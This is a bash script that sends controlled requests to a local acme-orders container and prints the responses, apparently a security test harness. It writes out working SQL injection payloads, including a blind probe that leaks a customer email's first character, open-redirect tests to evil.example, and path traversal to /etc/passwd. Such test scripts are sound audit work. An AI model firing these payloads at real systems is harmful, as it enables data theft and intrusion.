#!/usr/bin/env bash
# Sends controlled requests to a local acme-orders container and prints what
# came back. Usage: controlled-tests.sh BASE_URL LEGACY_BASE_URL
set -u
base=${1:-http://127.0.0.1:18080}
legacy=${2:-http://127.0.0.1:18081}
q() { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1], safe=""))' "$1"; }
body() { curl -s -g "$1" | head -c 160 | tr '\n' ' '; echo; }
status() { curl -s -g -o /dev/null -w '%{http_code}' "$1"; }
location() { curl -s -g -o /dev/null -w '%{http_code} %{redirect_url}' "$1"; echo; }
inj=$(q "x' OR '1'='1")
trav=$(q "../../../etc/passwd")

echo "## SQL injection"
echo "sql-01 baseline: $(body "$base/api/orders/search?status=shipped")"
echo "sql-01 payload:  $(body "$base/api/orders/search?status=$inj")"
echo "sql-02 payload:  $(body "$base/api/orders/by-status?status=$inj")"
echo "sql-03 payload:  $(body "$base/api/customers/by-name?name=$inj")"
echo "sql-04 payload:  HTTP $(status "$base/api/orders/$(q '1 OR 1=1')")"
echo "sql-06 payload:  $(body "$base/api/customers/by-email?email=$inj")"
echo "sql-07 default:  $(body "$base/api/customers/orders?reference=$(q "x' OR 1=1 --")")"
echo "sql-07 legacy:   $(body "$legacy/api/customers/orders?reference=$(q "x' OR 1=1 --")")"
echo "sql-08 payload:  $(body "$base/api/customers/emails?region=$inj")"
echo "sql-10 payload:  $(body "$base/api/orders/by-reference?reference=$inj")"
echo "sql-11 payload:  $(body "$base/api/customers/by-region?region=$inj")"
echo "sql-12 unsafe:   $(body "$base/api/orders/lookup?term=$(q "%' OR 1=1 --")")"
echo "sql-12 exact:    $(body "$base/api/orders/lookup?exact=true&term=$(q "%' OR 1=1 --")")"
echo "sql-13 bad col:  HTTP $(status "$base/api/orders/filter?status=shipped&sort=no_such_column")"
echo "sql-13 probe t:  $(body "$base/api/orders/filter?status=shipped&sort=$(q "(CASE WHEN (SELECT substr(email,1,1) FROM customers WHERE id=1)='a' THEN id ELSE -id END)")")"
echo "sql-13 probe f:  $(body "$base/api/orders/filter?status=shipped&sort=$(q "(CASE WHEN (SELECT substr(email,1,1) FROM customers WHERE id=1)='z' THEN id ELSE -id END)")")"

echo "## Open redirect"
echo "redir-01: $(location "$base/account/signed-in?returnUrl=$(q https://evil.example/)")"
echo "redir-02: $(location "$base/account/continue?returnUrl=$(q https://evil.example/)")"
echo "redir-03: $(location "$base/account/back?returnUrl=$(q https://evil.example/)")"
echo "redir-04: $(location "$base/account/switch?returnUrl=/ok&next=$(q https://evil.example/)")"
echo "redir-05: $(location "$base/links/out?next=$(q https://evil.example/)")"
echo "redir-06: $(location "$base/account/signed-out?returnUrl=$(q //evil.example/)")"

echo "## Path traversal"
echo "path-01: $(body "$base/api/documents/raw?name=$trav")"
echo "path-02: HTTP $(status "$base/api/documents/preview?name=$trav")"
echo "path-03: HTTP $(status "$base/api/documents/view?name=$trav")"
echo "path-04: $(body "$base/api/documents/legacy?name=$trav")"
echo "path-05: $(body "$base/api/documents/download?name=$trav")"
echo "path-06: $(body "$base/api/documents/open?name=$trav")"
echo "path-03 control (legit file): $(body "$base/api/documents/view?name=returns-policy.txt")"
